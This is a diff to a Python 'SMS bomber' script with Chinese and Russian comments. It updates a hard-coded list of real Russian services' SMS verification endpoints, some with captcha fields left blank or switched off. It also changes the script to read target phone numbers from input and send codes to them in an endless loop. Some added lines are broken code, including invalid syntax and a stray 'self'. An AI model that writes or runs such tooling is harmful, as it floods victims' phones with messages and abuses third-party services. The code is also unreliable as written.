@@ -15,30 +15,32 @@ import time
 def initAPI(phone):
     # 短信接口API 请求间隔时间 备注 请求方式 请求参数 需要SESSION的先决请求URL以及Referer
     APIList = [
-        ["https://foodband.ru/", 60, "FoodBand.ru", "POST",
-         {"event": "regsendcode", "phone": phone[1:], "session": random.randint(100000, 999999), "g-recaptcha-response": ""}, ""],
+        ["https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/", 60, "alpari", "GET",
+         "client_type": "personal", "email": random.choice(string.ascii_letters) for _ in range(9) + "@gmail.ru", "mobile_phone": phone, "deliveryOption": "sms"}, ""],
 
-        ["https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", 120, "Tinder", "POST", {"phone_number": phone},
+        ["https://guru.taxi/api/v1/driver/session/verify", 60, "Guru Taxi", "GET", {"phone": {"code": 1, "number": phone[1:]}},
          ""],
 
         ["https://krasnodar.delivery-club.ru/ajax/user_otp", 60, "Delivery Club", "POST", {"phone": phone}, ""],
 
-        ["https://krasnodar.delivery-club.ru/ajax/user_otp", 60, "Тинькофф", "POST",
-         {'MOBILENO': '+' + phone},
+        ["https://api.tinkoff.ru/v1/sign_up", 60, "Тинькофф", "POST",
+         {'phone': '+' + phone},
          ""],
 
-        ["https://youla.ru/web-api/auth/request_code", 120, "Юла", "POST", {'phone': phone},
+        ["https://youla.ru/web-api/auth/request_code", 60, "Юла", "POST", {'phone': phone},
          ""],
 
         [
-            'https://www.citilink.ru/registration/confirm/phone/+' + phone + '/',
-            60, "Ситилинк", "GET", {'phone': phone}, "http://reg.ztgame.com/"],
+            'https://kapibaras.ru/api/lk/sendCode',
+            60, "Kapibaras", "GET", {'phone': f'+{self.formatted_phone[0]}({self.formatted_phone[1:4]})-{self.formatted_phone[4:7]}-{self.formatted_phone[7:11]}', 'city': 1}, ""],
 
-        ["https://api.ivi.ru/mobileapi/user/register/phone/v6", 180, "Ivi", "POST",
-         {"phone": phone},
+        ["https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode", 60, "М. Видео", "POST",
+         {"phone": phone, "recaptcha": 'off', "g-recaptcha-response": ""},
          ""],
 
-        ["https://findclone.ru/register", 60, "FindClone Звонок", "GET", {"phone": '+' + phone},
+        ["https://terra-1.indriverapp.com/api/authorization?locale=ru", 60, "InDriver", "POST", {"mode": "request", "phone": "+" + phone,
+                                     "phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6",
+                                     "osversion": "unknown", "devicemodel": "unknown"},
          ""]
     ]
     return APIList
@@ -122,7 +124,7 @@ class Bomb(object):
                 session.get(SMS.getOthers(), timeout=5, headers=self.HEADERS)
                 self.HEADERS['Referer'] = SMS.getOthers()
             if SMS.getMethod() == "GET":
-                req = session.get(SMS.getUrl(), params=SMS.getParams(), timeout=5, headers=self.HEADERS)
+                req = session.post(SMS.getUrl(), json=SMS.getParams(), timeout=5, headers=self.HEADERS)
             else:
                 req = session.post(SMS.getUrl(), data=SMS.getParams(), timeout=5, headers=self.HEADERS)
         # print(req.url)
@@ -134,15 +136,16 @@ class Bomb(object):
 
 if __name__ == '__main__':
     # 手机号列表，如 ["12345678987","98765432123"]
-    phoneList=["79898208019"]
+    nomerok=input("Введите номера через пробел")
+    phoneList = nomerok.split(' ')
     bombNum=1
     while True: # 死循环
         currTime=0
-        print("\n第",bombNum,"次轰炸！！！","\n")
+        print("\nПошло поехало!!!11 Цклов:",bombNum,"Кароч все ок","\n")
         bombNum+=1
         for phone in phoneList: #遍历每个手机号
             APIList=initAPI(phone) # API接口初始化
-            print("\n电话：", phone)
+            print("\nНомерок：", phone)
             SMSList = initSMS().initBomb(APIList=APIList)
             switchOn = Bomb()
             i = 0
